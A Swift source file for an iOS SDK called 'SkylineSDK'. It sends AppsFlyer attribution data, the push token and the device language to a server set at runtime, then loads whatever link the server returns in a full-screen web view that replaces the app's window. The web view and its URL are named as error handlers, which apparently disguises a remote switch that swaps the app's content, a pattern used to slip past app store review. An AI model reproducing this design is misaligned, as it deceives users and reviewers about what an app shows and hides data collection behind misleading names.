import Foundation
import UIKit
import AppsFlyerLib
import Alamofire
import SwiftUI
import FBSDKCoreKit
import FBAEMKit
import AppTrackingTransparency
import AdSupport
import SdkPushExpress
import Combine
import WebKit

public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
    
    @AppStorage("savedData") var savedData: String?
    @AppStorage("initialURL") var initialURL: String?
    @AppStorage("statusFlag") var statusFlag: Bool = false
    
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        var conversionData = [String: Any]()
        conversionData[appsIDString] = AppsFlyerLib.shared().getAppsFlyerUID()
        conversionData[appsDataString] = conversionInfo
        conversionData[tokenString] = deviceToken
        conversionData[langString] = Locale.current.languageCode

        let jsonData = try! JSONSerialization.data(withJSONObject: conversionData, options: .fragmentsAllowed)
        let jsonString = String(data: jsonData, encoding: .utf8) ?? ""

        sendDataToServer(code: jsonString) { result in
            switch result {
            case .success(let message):
                self.sendNotification(name: "SkylineSDKNotification", message: message)
            case .failure:
                self.sendNotificationError(name: "SkylineSDKNotification")
            }
        }
    }
    
    public func onConversionDataFail(_ error: any Error) {
        self.sendNotificationError(name: "SkylineSDKNotification")
    }
    
    private func sendNotification(name: String, message: String) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(
                name: NSNotification.Name(name),
                object: nil,
                userInfo: ["notificationMessage": message]
            )
        }
    }
    
    private func sendNotificationError(name: String) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(
                name: NSNotification.Name(name),
                object: nil,
                userInfo: ["notificationMessage": "Error occurred"]
            )
        }
    }
    
    public static let shared = SkylineSDK()
    private var hasSessionStarted = false
    private var deviceToken: String = ""
    private var session: Session
    private var cancellables = Set<AnyCancellable>()
    
    private var appsDataString: String = ""
    private var appsIDString: String = ""
    private var langString: String = ""
    private var tokenString: String = ""
    
    private var domen: String = ""
    private var paramName: String = ""
    private var mainWindow: UIWindow?
    
    private override init() {
        let sessionConfig = URLSessionConfiguration.default
        sessionConfig.timeoutIntervalForRequest = 20
        sessionConfig.timeoutIntervalForResource = 20
        self.session = Alamofire.Session(configuration: sessionConfig)
    }

    public func initialize(
        appsFlyerKey: String,
        appID: String,
        pushExpressKey: String,
        appsDataString: String,
        appsIDString: String,
        langString: String,
        tokenString: String,
        domen: String,
        paramName: String,
        application: UIApplication,
        window: UIWindow,
        completion: @escaping (Result<String, Error>) -> Void
    ) {
        
        self.appsDataString = appsDataString
        self.appsIDString = appsIDString
        self.langString = langString
        self.tokenString = tokenString
        self.domen = domen
        self.paramName = paramName
        self.mainWindow = window

        ApplicationDelegate.shared.application(application, didFinishLaunchingWithOptions: nil)
        Settings.shared.isAdvertiserIDCollectionEnabled = true
        Settings.shared.isAutoLogAppEventsEnabled = true

        try? PushExpressManager.shared.initialize(appId: pushExpressKey)

        AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerKey
        AppsFlyerLib.shared().appleAppID = appID
        AppsFlyerLib.shared().delegate = self
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 15)
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSessionDidBecomeActive),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        
        completion(.success("Initialization completed successfully"))
    }

    public func registerForRemoteNotifications(deviceToken: Data) {
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        PushExpressManager.shared.transportToken = tokenString
        self.deviceToken = tokenString
    }

    @objc private func handleSessionDidBecomeActive() {
        if !self.hasSessionStarted {
            AppsFlyerLib.shared().start()
            self.hasSessionStarted = true
            ATTrackingManager.requestTrackingAuthorization { _ in }
        }
    }

    public func sendDataToServer(code: String, completion: @escaping (Result<String, Error>) -> Void) {
        let parameters = [paramName: code]
        session.request(domen, method: .get, parameters: parameters)
            .validate()
            .responseDecodable(of: ResponseData.self) { response in
                switch response.result {
                case .success(let decodedData):
                    PushExpressManager.shared.tags["webmaster"] = decodedData.naming
                    self.statusFlag = decodedData.first_link
                    try? PushExpressManager.shared.activate()
                    
                    if self.initialURL == nil {
                        self.initialURL = decodedData.naming
                        if self.statusFlag {
                            self.savedData = decodedData.naming
                        }
                        completion(.success(decodedData.link))
                    } else if decodedData.link == self.initialURL {
                        if self.savedData == nil {
                            if self.statusFlag {
                                self.savedData = decodedData.link
                            }
                            completion(.success(decodedData.link))
                        } else {
                            completion(.success(self.savedData!))
                        }
                    } else {
                        self.savedData = nil
                        self.initialURL = decodedData.link
                        if self.statusFlag {
                            self.savedData = decodedData.link
                        }
                        completion(.success(decodedData.link))
                    }
                    
                case .failure:
                    try? PushExpressManager.shared.activate()
                    completion(.failure(NSError(domain: "SkylineSDK", code: -1, userInfo: [NSLocalizedDescriptionKey: "Error occurred"])))
                }
            }
    }
    
    struct ResponseData: Codable {
        var link: String
        var naming: String
        var first_link: Bool
    }

    func showWeb(with url: String) {
        self.mainWindow = UIWindow(frame: UIScreen.main.bounds)
        let webController = WebController()
        webController.errorURL = url
        let navController = UINavigationController(rootViewController: webController)
        self.mainWindow?.rootViewController = navController
        self.mainWindow?.makeKeyAndVisible()
    }

    
    public class WebController: UIViewController, WKNavigationDelegate, WKUIDelegate {
        
        private var mainErrorsHandler: WKWebView!
        
        @AppStorage("savedData") var savedData: String?
        @AppStorage("statusFlag") var statusFlag: Bool = false
        
        public var errorURL: String!
        
        private var popUps: [UIViewController] = []
        
        public override func viewDidLoad() {
            super.viewDidLoad()
            
            let config = WKWebViewConfiguration()
            config.allowsInlineMediaPlayback = true
            config.mediaTypesRequiringUserActionForPlayback = []
            config.preferences.javaScriptEnabled = true

            let source = """
            var meta = document.createElement('meta');
            meta.name = 'viewport';
            meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
            var head = document.getElementsByTagName('head')[0];
            head.appendChild(meta);
            """
            let script = WKUserScript(source: source,
                                      injectionTime: .atDocumentEnd,
                                      forMainFrameOnly: true)
            config.userContentController.addUserScript(script)

            mainErrorsHandler = WKWebView(frame: .zero, configuration: config)
            mainErrorsHandler.isOpaque = false
            mainErrorsHandler.backgroundColor = .white
            mainErrorsHandler.uiDelegate = self
            mainErrorsHandler.navigationDelegate = self
            mainErrorsHandler.allowsBackForwardNavigationGestures = true

            view.addSubview(mainErrorsHandler)
            mainErrorsHandler.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                mainErrorsHandler.topAnchor.constraint(equalTo: view.topAnchor),
                mainErrorsHandler.bottomAnchor.constraint(equalTo: view.bottomAnchor),
                mainErrorsHandler.leadingAnchor.constraint(equalTo: view.leadingAnchor),
                mainErrorsHandler.trailingAnchor.constraint(equalTo: view.trailingAnchor)
            ])

            loadContent(urlString: errorURL)
        }

        public override func viewWillAppear(_ animated: Bool) {
            super.viewWillAppear(animated)
            navigationItem.largeTitleDisplayMode = .never
            navigationController?.isNavigationBarHidden = true
        }

        
        private func loadContent(urlString: String) {
            guard let encodedURL = urlString.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
                  let url = URL(string: encodedURL) else {
                return
            }
            var urlRequest = URLRequest(url: url)
            urlRequest.cachePolicy = .returnCacheDataElseLoad
            mainErrorsHandler.load(urlRequest)
        }

        public func webView(_ webView: WKWebView,
                            createWebViewWith configuration: WKWebViewConfiguration,
                            for navigationAction: WKNavigationAction,
                            windowFeatures: WKWindowFeatures) -> WKWebView? {
            
            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.uiDelegate = self
            popupWebView.navigationDelegate = self
            popupWebView.allowsBackForwardNavigationGestures = true
            popupWebView.backgroundColor = .white

            let popupVC = UIViewController()
            popupVC.view.backgroundColor = .systemBackground
            popupVC.view.addSubview(popupWebView)
            
            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: popupVC.view.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: popupVC.view.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: popupVC.view.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: popupVC.view.trailingAnchor)
            ])

            let navController = UINavigationController(rootViewController: popupVC)
            popupVC.navigationItem.leftBarButtonItem = UIBarButtonItem(
                barButtonSystemItem: .done,
                target: self,
                action: #selector(closePopup(sender:))
            )
            popUps.append(popupVC)  
            self.present(navController, animated: true)

            return popupWebView
        }

        public func webViewDidClose(_ webView: WKWebView) {
            if let index = popUps.firstIndex(where: { vc in
                vc.view.subviews.contains(webView)
            }) {
                let popupToClose = popUps[index]
                popUps.remove(at: index)
                popupToClose.dismiss(animated: true)
            }
        }

        @objc private func closePopup(sender: UIBarButtonItem) {
            self.dismiss(animated: true)
        }

    }
    
    public struct WebControllerSwiftUI: UIViewControllerRepresentable {
        public var errorDetail: String

        public init(errorDetail: String) {
            self.errorDetail = errorDetail
        }

        public func makeUIViewController(context: Context) -> WebController {
            let viewController = WebController()
            viewController.errorURL = errorDetail
            return viewController
        }

        public func updateUIViewController(_ uiViewController: WebController, context: Context) {}
    }
}
